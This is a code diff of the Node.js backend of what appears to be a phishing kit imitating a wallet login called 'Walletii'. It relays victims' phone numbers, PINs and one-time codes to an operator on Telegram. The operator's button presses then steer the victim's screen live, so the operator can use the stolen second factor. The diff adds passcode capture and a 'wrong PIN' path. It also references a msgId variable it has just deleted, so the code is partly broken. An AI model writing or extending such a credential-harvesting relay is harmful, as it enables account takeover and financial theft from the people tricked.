@@ -4,7 +4,7 @@
 //  server.js — Walletii Backend
 //  Routes:
 //    GET  /         ← serves index.html
-//    POST /notify   ← called by the HTML app (login or OTP event)
+//    POST /notify   ← called by the HTML app (login, otp, resend events)
 //    POST /poll     ← called by the HTML app every 2s to check admin decision
 //    POST /webhook  ← called by Telegram when admin clicks a button
 //    GET  /setup    ← visit once to register the webhook with Telegram
@@ -18,7 +18,7 @@ import { fileURLToPath } from 'url';
 import path              from 'path';
 import config            from './config.js';
 import { setResult, popResult, setSession, getSession } from './store.js';
-import { sendAdminMessage, editMessage, answerCallback, registerWebhook, escMd } from './telegram.js';
+import { sendAdminMessage, removeButtons, answerCallback, registerWebhook, escMd } from './telegram.js';
 
 const app       = express();
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
@@ -26,7 +26,7 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 // ── Middleware ──
 app.use(express.json());
 app.use(cors({
-  origin:         true, // reflects request origin — works for all cases
+  origin:         true,
   methods:        ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type'],
 }));
@@ -44,7 +44,6 @@ app.get('/health', (_req, res) => {
 
 // ════════════════════════════════════════════════════════
 //  GET /setup
-//  Visit once after deploying to register the Telegram webhook.
 // ════════════════════════════════════════════════════════
 app.get('/setup', async (_req, res) => {
   try {
@@ -66,6 +65,10 @@ app.get('/setup', async (_req, res) => {
 
 // ════════════════════════════════════════════════════════
 //  POST /notify
+//
+//  type = 'login'   → Login alert with [✅ Send OTP] [❌ Wrong PIN]
+//  type = 'otp'     → OTP alert with [✅ Continue] [❌ Wrong Code]
+//  type = 'resend'  → Informational resend notification (no buttons)
 // ════════════════════════════════════════════════════════
 app.post('/notify', async (req, res) => {
   const { type, phone, countryCode, otp, passcode } = req.body;
@@ -74,35 +77,50 @@ app.post('/notify', async (req, res) => {
     return res.status(400).json({ ok: false, error: 'Missing required fields' });
   }
 
+  const fullPhone = `${countryCode || ''} ${phone}`.trim();
+
+  // ── Resend: just send a notification, no polling needed ──
+  if (type === 'resend') {
+    const text = `🔄 *Resend Code Requested*\n\n`
+               + `📱 *Phone:* \`${escMd(fullPhone)}\`\n\n`
+               + `User has requested a new OTP code\\.`;
+    const tgResult = await sendAdminMessage(text, []);
+    if (!tgResult.ok) {
+      console.error('Telegram error:', tgResult);
+      return res.status(500).json({ ok: false, error: 'Telegram error' });
+    }
+    return res.json({ ok: true });
+  }
+
   // ── Generate a short token + HMAC sig ──
-  const token = crypto.randomBytes(8).toString('hex'); // 16 chars — keeps callback_data short
+  const token = crypto.randomBytes(8).toString('hex');
   const sig   = crypto.createHmac('sha256', config.secretKey)
                       .update(`${token}|${phone}`)
                       .digest('hex');
 
-  // ── Store session server-side so webhook can verify without stuffing it in button data ──
   setSession(token, phone, sig, config.tokenTtl);
 
-  // ── callback_data = "action|token" — well under Telegram's 64-byte limit ──
   const cbData = (action) => `${action}|${token}`;
-
-  const fullPhone = `${countryCode || ''} ${phone}`.trim();
 
   try {
     let text, keyboard;
 
     if (type === 'login') {
-      text = `🔔 *New Login Attempt*\n\n`
-           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n\n`
-           + `User is waiting on the OTP screen\\.`;
+      // ── LOGIN ALERT — permanent message with Send OTP / Wrong PIN ──
+      text = `🔔 *New Login Alert*\n\n`
+           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
+           + (passcode ? `🔒 *Passcode:* \`${escMd(passcode)}\`\n` : '')
+           + `\nUser is waiting on the OTP screen\\.`;
 
       keyboard = [[
-        { text: '✅ Send OTP', callback_data: cbData('send_otp') }
+        { text: '✅ Send OTP',  callback_data: cbData('send_otp')   },
+        { text: '❌ Wrong PIN', callback_data: cbData('wrong_pin')  },
       ]];
 
     } else if (type === 'otp') {
       if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });
 
+      // ── OTP ALERT — permanent message with Continue / Wrong Code ──
       text = `🔐 *OTP Submitted*\n\n`
            + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
            + `🔑 *OTP:* \`${escMd(otp)}\`\n`
@@ -155,9 +173,11 @@ app.post('/poll', (req, res) => {
 // ════════════════════════════════════════════════════════
 //  POST /webhook
 //  Telegram calls this when the admin clicks a button.
+//  Messages are kept permanent — we send a new follow-up
+//  message instead of editing/deleting the original.
 // ════════════════════════════════════════════════════════
 app.post('/webhook', async (req, res) => {
-  res.json({ ok: true }); // respond immediately so Telegram doesn't retry
+  res.json({ ok: true });
 
   const update = req.body;
   if (!update?.callback_query) return;
@@ -166,7 +186,6 @@ app.post('/webhook', async (req, res) => {
   const cbId   = cb.id;
   const data   = cb.data || '';
   const chatId = cb.message?.chat?.id?.toString();
-  const msgId  = cb.message?.message_id;
 
   // ── Only our admin can use these buttons ──
   if (chatId !== config.adminChatId.toString()) {
@@ -199,25 +218,35 @@ app.post('/webhook', async (req, res) => {
     return;
   }
 
-  // ── Handle the action ──
+  // ── Handle the action — send follow-up message, keep original intact ──
   try {
     switch (action) {
 
       case 'send_otp':
         setResult(token, 'otp_allowed', config.tokenTtl);
-        await editMessage(chatId, msgId, `✅ *OTP Approved*\nUser may now enter their OTP code\\.`);
+        await removeButtons(chatId, msgId);
+        await sendAdminMessage(`✅ *OTP Sent*\nUser \`${escMd(session.phone)}\` may now enter their OTP code\\.`, []);
         await answerCallback(cbId, '✅ OTP sent to user');
+        break;
+
+      case 'wrong_pin':
+        setResult(token, 'wrong_pin', config.tokenTtl);
+        await removeButtons(chatId, msgId);
+        await sendAdminMessage(`❌ *Wrong PIN*\nUser \`${escMd(session.phone)}\` has been notified their PIN is incorrect\\.`, []);
+        await answerCallback(cbId, '❌ Wrong PIN sent to user');
         break;
 
       case 'otp_ok':
         setResult(token, 'otp_correct', config.tokenTtl);
-        await editMessage(chatId, msgId, `✅ *Login Approved*\nUser has been allowed in\\.`);
+        await removeButtons(chatId, msgId);
+        await sendAdminMessage(`✅ *Login Approved*\nUser \`${escMd(session.phone)}\` has been allowed in\\.`, []);
         await answerCallback(cbId, '✅ User allowed in');
         break;
 
       case 'otp_wrong':
         setResult(token, 'otp_wrong', config.tokenTtl);
-        await editMessage(chatId, msgId, `❌ *Wrong Code*\nUser has been notified to re\\-enter their OTP\\.`);
+        await removeButtons(chatId, msgId);
+        await sendAdminMessage(`❌ *Wrong Code*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their OTP\\.`, []);
         await answerCallback(cbId, '❌ Wrong code sent to user');
         break;
 
